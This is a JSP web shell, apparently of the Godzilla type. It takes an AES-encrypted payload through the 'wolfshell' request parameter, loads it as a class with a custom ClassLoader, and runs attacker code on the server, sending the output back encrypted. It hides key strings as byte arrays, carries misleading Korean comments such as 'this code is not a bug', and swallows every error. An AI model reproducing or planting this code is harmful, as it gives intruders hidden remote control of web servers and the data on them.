<%!
// 이 키는 데이터 암호화에 사용됩니다.
String cfg_k = "3c6e0b8a9c15224a";
// 요청 매개변수의 이름입니다.
String cfg_p = "wolfshell";
// 체크섬은 무결성을 보장합니다.
String cfg_m = gen_hash(cfg_p+cfg_k);

// 동적 클래스 로딩을 위한 헬퍼.
class Helper_1 extends ClassLoader{
    public Helper_1(ClassLoader p){super(p);}
    public Class run_def(byte[] b){return super.defineClass(b, 0, b.length);}
}

// 이 함수는 데이터를 변환합니다.
public byte[] transform(byte[] s,boolean m){
    try{
        String a = new String(new byte[]{65,69,83});
        javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(a);
        c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(cfg_k.getBytes(),a));
        return c.doFinal(s);
    }catch (Exception e){
        return null;
    }
}

// 해시 생성 함수.
public static String gen_hash(String s) {
    String r = null;
    try {
        java.security.MessageDigest m = java.security.MessageDigest.getInstance("MD5");
        m.update(s.getBytes(), 0, s.length());
        r = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
    } catch (Exception e) {}
    return r;
}

// 데이터를 문자열로 인코딩합니다.
public static String to_str(byte[] bs) throws Exception {
    Class c;String v = null;
    try {
        c=Class.forName("java.util.Base64");
        Object E = c.getMethod("getEncoder", null).invoke(c, null);
        v = (String)E.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(E, new Object[] { bs });
    } catch (Exception e) {
        try {
            c=Class.forName("sun.misc.BASE64Encoder");
            Object E = c.newInstance();
            v = (String)E.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(E, new Object[] { bs });
        } catch (Exception e2) {}
    }
    return v;
}

// 문자열을 데이터로 디코딩합니다.
public static byte[] from_str(String bs) throws Exception {
    Class c;byte[] v = null;
    try {
        c=Class.forName("java.util.Base64");
        Object D = c.getMethod("getDecoder", null).invoke(c, null);
        v = (byte[])D.getClass().getMethod("decode", new Class[] { String.class }).invoke(D, new Object[] { bs });
    } catch (Exception e) {
        try {
            c=Class.forName("sun.misc.BASE64Decoder");
            Object D = c.newInstance();
            v = (byte[])D.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(D, new Object[] { bs });
        } catch (Exception e2) {}
    }
    return v;
}
%><%
try{
    // 점심 뭐 먹지?
    byte[] raw_data=from_str(request.getParameter(cfg_p));
    // 이 코드는 버그가 아닙니다.
    raw_data=transform(raw_data, false);
    // 세션에서 객체를 확인합니다.
    String sess_key = new String(new byte[]{112,97,121,108,111,97,100});
    if (session.getAttribute(sess_key)==null){
        // 첫 번째 요청 처리.
        session.setAttribute(sess_key,new Helper_1(this.getClass().getClassLoader()).run_def(raw_data));
    }else{
        // 후속 요청 처리.
        request.setAttribute("parameters",raw_data);
        java.io.ByteArrayOutputStream out_stream=new java.io.ByteArrayOutputStream();
        Object obj_inst=((Class)session.getAttribute(sess_key)).newInstance();
        obj_inst.equals(out_stream);
        obj_inst.equals(pageContext);
        // 응답을 작성합니다.
        response.getWriter().write(cfg_m.substring(0,16));
        obj_inst.toString();
        // 출력을 암호화하고 인코딩합니다.
        response.getWriter().write(to_str(transform(out_stream.toByteArray(), true)));
        response.getWriter().write(cfg_m.substring(16));
    }
}catch (Exception e){
    // 모든 예외는 조용히 처리됩니다.
}
%>